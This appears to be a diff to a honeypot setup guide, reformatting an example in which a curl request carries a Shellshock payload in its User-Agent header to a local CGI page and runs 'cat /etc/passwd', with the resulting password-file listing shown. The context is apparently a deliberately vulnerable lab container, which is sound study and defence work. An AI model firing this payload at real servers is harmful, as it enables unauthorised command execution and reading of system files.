@@ -55,11 +55,13 @@ ___NOTE 3: Make sure you limit your containers resources and security so it does
 Result:
 
 ```
-root@honey-net-worker1:~# curl -H                                       \
-> "user-agent:                                  \
-> () { :; }; echo; echo;                        \
-> /bin/bash -c 'cat /etc/passwd'"               \
-> http://localhost:8080/cgi-bin/test-page.cgi
+root@honey-net-worker1:~# 
+
+curl -H                                       \
+"user-agent:                                  \
+() { :; }; echo; echo;                        \
+/bin/bash -c 'cat /etc/passwd'"               \
+http://localhost:8080/cgi-bin/test-page.cgi
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
